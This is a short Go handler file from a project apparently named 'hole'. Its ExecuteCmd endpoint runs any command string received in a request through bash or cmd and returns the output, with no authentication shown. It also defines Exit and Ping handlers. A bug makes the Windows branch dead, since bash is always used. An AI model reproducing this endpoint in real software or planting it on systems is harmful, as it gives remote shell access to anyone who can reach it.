package handler

import (
	"bytes"
	"github.com/sllt/booby"
	"github.com/sllt/hole/internal/model/dto"
	"os"
	"os/exec"
	"runtime"
)

func Exit(ctx *booby.Context) {
	_ = ctx.Write("bye")
	os.Exit(0)
}

func ExecuteCmd(ctx *booby.Context) {
	var req dto.ExecuteRequest
	err := ctx.Bind(&req)
	if err != nil {
		return
	}

	output, err := runCommand(req.Command)
	if err != nil {
		_ = ctx.Write(err.Error())
		return
	}
	_ = ctx.Write(output)
}

func runCommand(commandLine string) (string, error) {

	var cmd *exec.Cmd

	if runtime.GOOS == "linux" || runtime.GOOS == "darwin" {
		cmd = exec.Command("bash", "-c", commandLine)
	} else {
		cmd = exec.Command("cmd", "/C", commandLine)
	}

	cmd = exec.Command("bash", "-c", commandLine)

	var out bytes.Buffer
	cmd.Stdout = &out
	var stderr bytes.Buffer
	cmd.Stderr = &stderr

	// 运行命令并捕获输出
	err := cmd.Run()
	if err != nil {
		return stderr.String(), err
	}

	return out.String(), nil
}

func Ping(ctx *booby.Context) {
	_ = ctx.Write("ok")
}
